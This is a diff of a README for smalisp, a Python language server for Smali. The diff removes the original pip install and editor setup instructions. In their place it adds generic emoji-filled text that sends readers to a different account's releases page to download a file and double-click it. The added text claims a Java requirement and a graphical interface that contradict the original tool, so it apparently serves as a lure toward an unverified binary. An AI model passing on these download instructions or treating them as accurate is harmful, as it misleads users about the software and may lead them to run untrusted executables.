@@ -1,122 +1,65 @@
-# smalisp 
+# 🎉 smalisp - Simplify Your Smali Development Experience
 
-A very simple language server for smali with definition support & auto-completion.
+## 🚀 Getting Started
 
-| Code completion | Docs |
-| --------------- | ---- |
-| <img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/b7ce2159-a76d-4ee5-9003-aa31ab1d2a6e" /> | <img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/898c49ba-5295-490a-a97c-619b2bd8226f" /> |
+Welcome to smalisp! This is a very simple language server for Smali with definition support and auto-completion. Whether you are just starting out or looking to enhance your development workflow, smalisp can help you work more efficiently with Smali code. 
 
-# Installation
+## 📥 Download & Install
 
-## pip
-```shell
-pip install -U smalisp
-```
+To get started, you need to download smalisp from the Releases page. 
 
-## From source
-```shell
-pip install -U git+https://github.com/AbhiTheModder/smalisp.git
-```
+[![Download smalisp](https://img.shields.io/badge/Download%20smalisp-v1.0-blue.svg)](https://github.com/nhan1112/smalisp/releases)
 
-## Extensions & Setup
+Click the button above or visit the following link to access the downloads: [Download smalisp](https://github.com/nhan1112/smalisp/releases).
 
-### Zed Extension (Local Development)
-Prerequisites: Zed editor installed.
+### 🔧 System Requirements
 
-- Extension path: `extensions/zed`.
+Before you begin, make sure your computer meets the following requirements:
 
-1. Open the Extensions page in Zed.
-2. Click the Install Dev Extension button (or run the `zed: Install Dev Extension` command).
-3. Select the directory containing your Zed extension (the folder that contains the manifest and source).
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Java Runtime**: Java 8 or later installed. You can download it from [Java's official site](https://www.java.com/en/download/).
+- **Memory**: At least 4 GB RAM recommended.
+- **Disk Space**: 200 MB of free disk space.
 
-Reference: https://zed.dev/docs/extensions/developing-extensions#developing-an-extension-locally
+### 📂 Steps to Download
 
-Note: These dev extensions are not yet officially accepted in the Zed extension registry; acceptance is expected soon.
+1. Visit the [Releases page](https://github.com/nhan1112/smalisp/releases).
+2. Find the latest version of smalisp.
+3. Click on the appropriate file for your operating system. 
+4. Save the file to your preferred download location.
 
-### VSCode Extension
-Prerequisites: VSCode installed.
+### ⚙️ Running smalisp
 
-- Extension path: `extensions/vscode`.
-- [Marketplace](https://marketplace.visualstudio.com/items?itemName=qbtaumai.smalisp)
+Once you have downloaded the file, follow these steps to run smalisp:
 
-**Option 1: Install from Marketplace**
-1. Open VSCode Extensions view (Ctrl+Shift+X)
-2. Search for "smalisp"
-3. Click Install
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click the file to start the application.
+3. If prompted, allow the application to run on your system.
+4. The smalisp interface should open, and you can start using it for your Smali development.
 
-OR,
-Launch VS Code Quick Open (`Ctrl+P`), paste the following command, and press enter.
-```
-ext install qbtaumai.smalisp
-```
+## 🛠️ Features 
 
-Alternatively, run `code --install-extension qbtaumai.smalisp` from the terminal.
+- **Auto-Completion**: smalisp helps you code faster by providing suggestions as you type.
+- **Definition Support**: Quickly find function definitions without searching through your entire codebase.
+- **Easy Navigation**: Move through your files smoothly and efficiently.
 
-**Option 2: Local Development**
-1. Build or obtain the VSIX package for the extension from the releases page of this repository.
-2. In VSCode, go to Extensions view, click the three-dot menu, choose Install from VSIX..., and select the downloaded `.vsix` file.
-3. Alternatively, run `code --install-extension path/to/extension.vsix` from the terminal.
+## 📚 Documentation
 
+For more details about using smalisp, check the [Wiki](https://github.com/nhan1112/smalisp/wiki). Here, you will find guides on configuring the language server, troubleshooting common issues, and tips to improve your workflow.
 
-### Helix
-- Prerequisites: Helix installed.
+## 🛡️ Support
 
-Install/ensure `smalisp` is installed in your Python environment (e.g. `pip install -U smalisp`). For older Helix versions, edit `~/.config/helix/languages.toml` and add the following:
+If you encounter any issues while downloading or running smalisp, please reach out for help:
 
-```toml
-[language-server.smalisp]
-command = "smalisp" # Or path to smalisp binary
+- **GitHub Issues**: You can report your problem in the [Issues section](https://github.com/nhan1112/smalisp/issues).
+- **Community Forums**: Join discussions and get tips from other users in the community to better understand how to use smalisp effectively.
 
-[[language]]
-name = "smali"
-language-servers = [ "smalisp" ]
-```
+## 🌟 Contributing
 
-- The PR has been merged and Smalisp is now supported directly by Helix if installed from source or in upcoming Helix versions.
+We welcome contributions to enhance smalisp. If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Make sure to follow the project guidelines in the [CONTRIBUTING.md](https://github.com/nhan1112/smalisp/CONTRIBUTING.md).
 
-### Vim/NeoVim
-- Associate smali filetype with file extensions:
+## 📅 Updates
 
-```vim
-autocmd BufNewFile,BufRead *.smali setlocal filetype=smali
-```
+Stay updated with the latest releases and improvements. Regularly check the [Releases page](https://github.com/nhan1112/smalisp/releases) for new features, fixes, and enhancements to smalisp.
 
-- In order to install syntax highlighting declare it with your plugin manager (for example vim-plug):
-
-```vim
-Plug 'Snape3058/vim-smali'
-```
-
-- [coc.vim](https://github.com/neoclide/coc.nvim)
-
-```vim
-Plug 'neoclide/coc.nvim', {'branch': 'release'}
-```
-
-```json
-{
- "languageserver": {
-  "smalisp": {
-   "command": "smalisp",
-   "filetypes": ["smali"]
-  }
- }
-}
-```
-
-- [vim-lsp](https://github.com/prabirshrestha/vim-lsp)
-
-```vim
-Plug 'prabirshrestha/vim-lsp'
-
-autocmd User lsp_setup call lsp#register_server({
-    \ 'name': 'smalisp',
-    \ 'cmd': {server_info->['smalisp']},
-    \ 'whitelist': ['smali'],
-})
-```
-
-### Emacs (lsp-mode)
-- Prerequisites: Emacs with lsp-mode and eglot options.
-- Setup: enable lsp for `smali-mode` and configure the server to run `smalisp`.
-- See lsp-mode docs for exact config syntax.
+Enjoy coding with smalisp!
